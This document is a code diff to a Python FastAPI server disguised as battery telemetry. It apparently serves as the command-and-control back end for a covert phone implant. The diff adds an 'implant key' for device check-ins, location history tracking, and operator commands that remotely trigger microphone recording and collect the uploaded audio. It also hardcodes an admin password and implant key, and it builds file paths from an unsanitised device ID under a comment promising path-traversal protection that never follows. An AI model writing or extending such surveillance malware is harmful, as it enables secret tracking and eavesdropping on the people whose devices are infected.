@@ -2,8 +2,12 @@ import sqlite3
 import time
 import secrets
 import hashlib
+import re
+import os
+import shutil
 import math
-from fastapi import FastAPI, Form, Request, Depends, HTTPException, status, Response
+from fastapi import FastAPI, Form, Request, Depends, HTTPException, status, Response, UploadFile, File
+from fastapi.staticfiles import StaticFiles
 from fastapi.responses import HTMLResponse, JSONResponse, FileResponse, RedirectResponse
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
@@ -20,6 +24,7 @@ app.add_middleware(
 DB_FILE = "telemetry.db"
 ADMIN_USERNAME = "admin"
 ADMIN_PASSWORD_HASH = hashlib.sha256("SuperSecret2027".encode()).hexdigest()
+IMPLANT_KEY = "DeltaForce2027"
 
 def haversine(lat1, lon1, lat2, lon2):
     # Radius of earth in kilometers
@@ -32,7 +37,9 @@ def haversine(lat1, lon1, lat2, lon2):
 
 def init_db():
     conn = sqlite3.connect(DB_FILE)
+    conn = get_db()
     c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL;")
     c.execute('''
         CREATE TABLE IF NOT EXISTS devices (
             device_id TEXT PRIMARY KEY,
@@ -46,11 +53,22 @@ def init_db():
     try:
         c.execute("ALTER TABLE devices ADD COLUMN ping_interval INTEGER DEFAULT 60")
     except:
+        pass
         pass # Column might already exist
         
     try:
         c.execute("ALTER TABLE devices ADD COLUMN notif_state INTEGER DEFAULT 0")
         c.execute("ALTER TABLE devices ADD COLUMN notif_text TEXT DEFAULT ''")
+    except:
+        pass
+
+    try:
+        c.execute("ALTER TABLE devices ADD COLUMN play_audio INTEGER DEFAULT 0")
+    except:
+        pass
+
+    try:
+        c.execute("ALTER TABLE devices ADD COLUMN record_audio INTEGER DEFAULT 0")
     except:
         pass
 
@@ -86,6 +104,7 @@ def verify_session(request: Request):
         raise HTTPException(status_code=401, detail="Unauthorized")
     conn = get_db()
     c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL;")
     c.execute("SELECT * FROM sessions WHERE token = ?", (token,))
     session = c.fetchone()
     conn.close()
@@ -118,6 +137,7 @@ async def process_login(response: Response, username: str = Form(...), password:
         token = secrets.token_urlsafe(64)
         conn = get_db()
         c = conn.cursor()
+        c.execute("PRAGMA journal_mode=WAL;")
         
         # OPTIMIZATION: Prune expired sessions (older than 24 hours) to prevent database bloat
         c.execute("DELETE FROM sessions WHERE created_at < ?", (time.time() - 86400,))
@@ -137,6 +157,7 @@ async def logout(response: Response, request: Request):
     if token:
         conn = get_db()
         c = conn.cursor()
+        c.execute("PRAGMA journal_mode=WAL;")
         c.execute("DELETE FROM sessions WHERE token = ?", (token,))
         conn.commit()
         conn.close()
@@ -154,34 +175,46 @@ async def read_root(request: Request):
 
 class TelemetryReport(BaseModel):
     device_id: str
+    implant_key: str = None
     level: int = None
     lat: float = None
     lon: float = None
 
 @app.post("/battery_report")
 async def receive_battery(
+    implant_key: str = Form(None),
     device_id: str = Form(None), 
     level: int = Form(None), 
     lat: float = Form(None), 
     lon: float = Form(None), 
     payload: TelemetryReport = None
 ):
+    provided_key = None
     if payload is not None:
+        provided_key = payload.implant_key
         did = payload.device_id
         lvl = payload.level
         lat_val = payload.lat
         lon_val = payload.lon
     else:
+        provided_key = implant_key
         did = device_id
         lvl = level
         lat_val = lat
         lon_val = lon
 
+    # Security check: Drop the request if the implant key is missing or incorrect
+    if not provided_key or not secrets.compare_digest(provided_key, IMPLANT_KEY):
+        return JSONResponse({"status": "error", "message": "Unauthorized Payload"}, status_code=403)
+
     if not did:
         did = "unknown_device"
 
+    # Sanitize inputs to prevent Path Traversal
+
     conn = get_db()
     c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL;")
     c.execute("SELECT * FROM devices WHERE device_id = ?", (did,))
     existing = c.fetchone()
     
@@ -194,11 +227,13 @@ async def receive_battery(
     ping_interval = existing['ping_interval'] if existing else 60
     notif_state = existing['notif_state'] if existing and 'notif_state' in existing.keys() else 0
     notif_text = existing['notif_text'] if existing and 'notif_text' in existing.keys() else ""
+    play_audio = existing['play_audio'] if existing and 'play_audio' in existing.keys() else 0
+    record_audio = existing['record_audio'] if existing and 'record_audio' in existing.keys() else 0
 
     c.execute('''
-        INSERT OR REPLACE INTO devices (device_id, level, lat, lon, timestamp, ping_interval, notif_state, notif_text)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-    ''', (did, new_lvl, new_lat, new_lon, new_ts, ping_interval, notif_state, notif_text))
+        INSERT OR REPLACE INTO devices (device_id, level, lat, lon, timestamp, ping_interval, notif_state, notif_text, play_audio, record_audio)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    ''', (did, new_lvl, new_lat, new_lon, new_ts, ping_interval, notif_state, notif_text, play_audio, record_audio))
     
     if lat_val is not None and lon_val is not None:
         if not existing or existing['lat'] != lat_val or existing['lon'] != lon_val:
@@ -220,13 +255,16 @@ async def receive_battery(
         "device_id": did, 
         "next_ping_seconds": ping_interval,
         "notif_state": notif_state,
-        "notif_text": notif_text
+        "notif_text": notif_text,
+        "play_audio": play_audio,
+        "record_audio": record_audio
     }
 
 @app.post("/set_interval")
 async def set_interval(device_id: str = Form(...), interval: int = Form(...), verified: bool = Depends(verify_session)):
     conn = get_db()
     c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL;")
     c.execute("UPDATE devices SET ping_interval = ? WHERE device_id = ?", (interval, device_id))
     conn.commit()
     conn.close()
@@ -236,15 +274,27 @@ async def set_interval(device_id: str = Form(...), interval: int = Form(...), ve
 async def set_notification(device_id: str = Form(...), state: int = Form(...), text: str = Form(""), verified: bool = Depends(verify_session)):
     conn = get_db()
     c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL;")
     c.execute("UPDATE devices SET notif_state = ?, notif_text = ? WHERE device_id = ?", (state, text, device_id))
     conn.commit()
     conn.close()
     return {"status": "updated", "state": state, "text": text}
 
+@app.post("/set_audio")
+async def set_audio(device_id: str = Form(...), play_audio: int = Form(...), verified: bool = Depends(verify_session)):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL;")
+    c.execute("UPDATE devices SET play_audio = ? WHERE device_id = ?", (play_audio, device_id))
+    conn.commit()
+    conn.close()
+    return {"status": "updated", "play_audio": play_audio}
+
 @app.get("/devices")
 async def get_devices(verified: bool = Depends(verify_session)):
     conn = get_db()
     c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL;")
     c.execute("SELECT device_id FROM devices")
     devices = [row['device_id'] for row in c.fetchall()]
     conn.close()
@@ -254,6 +304,7 @@ async def get_devices(verified: bool = Depends(verify_session)):
 async def get_stats(device_id: str = None, verified: bool = Depends(verify_session)):
     conn = get_db()
     c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL;")
     
     if device_id:
         c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
@@ -304,6 +355,7 @@ async def history_view(request: Request):
 async def get_history_detailed(device_id: str, verified: bool = Depends(verify_session)):
     conn = get_db()
     c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL;")
     c.execute("SELECT lat, lon, timestamp FROM location_history WHERE device_id = ? ORDER BY unix_time DESC", (device_id,))
     records = [{"lat": row['lat'], "lon": row['lon'], "time": row['timestamp']} for row in c.fetchall()]
     conn.close()
@@ -313,6 +365,7 @@ async def get_history_detailed(device_id: str, verified: bool = Depends(verify_s
 async def get_history(device_id: str, verified: bool = Depends(verify_session)):
     conn = get_db()
     c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL;")
     c.execute("SELECT lat, lon FROM location_history WHERE device_id = ? ORDER BY unix_time ASC", (device_id,))
     coords = [[row['lat'], row['lon']] for row in c.fetchall()]
     conn.close()
@@ -321,3 +374,57 @@ async def get_history(device_id: str, verified: bool = Depends(verify_session)):
 @app.get("/health")
 async def health():
     return {"status": "ok"}
+
+os.makedirs('static/audio', exist_ok=True)
+app.mount("/static", StaticFiles(directory="static"), name="static")
+
+@app.post("/set_record_audio")
+async def set_record_audio(device_id: str = Form(...), record_audio: int = Form(...), verified: bool = Depends(verify_session)):
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL;")
+    c.execute("UPDATE devices SET record_audio = ? WHERE device_id = ?", (record_audio, device_id))
+    conn.commit()
+    conn.close()
+    return {"status": "updated", "record_audio": record_audio}
+
+@app.post("/upload_audio")
+async def upload_audio(
+    implant_key: str = Form(...),
+    device_id: str = Form(...),
+    file: UploadFile = File(None),
+    error: str = Form(None)
+):
+    if not secrets.compare_digest(implant_key, IMPLANT_KEY):
+        return JSONResponse({"status": "error", "message": "Unauthorized Payload"}, status_code=403)
+        
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("PRAGMA journal_mode=WAL;")
+
+    if error == "busy":
+        # Save a dummy error file to UI to let user know it failed
+        filename = f"static/audio/{device_id}_{int(time.time())}_BUSY.txt"
+        with open(filename, "w") as f:
+            f.write("Microphone was busy by another app - 0.0s recorded")
+        c.execute("UPDATE devices SET record_audio = 0 WHERE device_id = ?", (device_id,))
+    elif file:
+        filename = f"static/audio/{device_id}_{int(time.time())}.wav"
+        with open(filename, "wb") as buffer:
+            shutil.copyfileobj(file.file, buffer)
+        c.execute("UPDATE devices SET record_audio = 0 WHERE device_id = ?", (device_id,))
+
+    conn.commit()
+    conn.close()
+    
+    return {"status": "success"}
+
+@app.get("/audio_files")
+async def get_audio_files(device_id: str, verified: bool = Depends(verify_session)):
+    files = []
+    if os.path.exists("static/audio"):
+        for f in os.listdir("static/audio"):
+            if f.startswith(device_id) and (f.endswith(".wav") or f.endswith("BUSY.txt")):
+                files.append(f"/static/audio/{f}")
+    files.sort(reverse=True)
+    return {"files": files}
